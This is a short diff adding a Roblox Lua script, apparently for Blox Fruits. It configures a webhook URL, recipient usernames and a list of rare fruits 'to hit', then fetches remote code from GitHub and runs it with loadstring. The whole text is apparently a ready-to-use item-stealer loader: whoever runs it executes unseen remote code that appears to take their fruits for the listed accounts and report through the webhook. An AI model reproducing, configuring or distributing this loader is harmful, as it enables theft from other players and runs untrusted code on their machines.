@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=b0V5Z3RXOFM2Tm1wTnRRSzRtSG1zZzpvUjVhU0x3ejNfWkExbGxfakNpWW8tV2oxdVhhU082d3ZiSmtnSXNZb2VEaUhHT3VhdXZIcnRXTzZILUU1Zm9aX2Y2LUNUckRTWXctVzNsdlVseFdwU3F3dnBxWUpSYjdQREtybUhaOW1MazBsTnRHV3ZiSXlsdWoxRU4tVTJYajl1TGRTRU5tWXVRYW02RXo4WnFyT3M0OXFxc0FTU3VabmwtcC1kTDRpcm8" -- << Your Webhook
+Usernames = {"aimbot09272"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
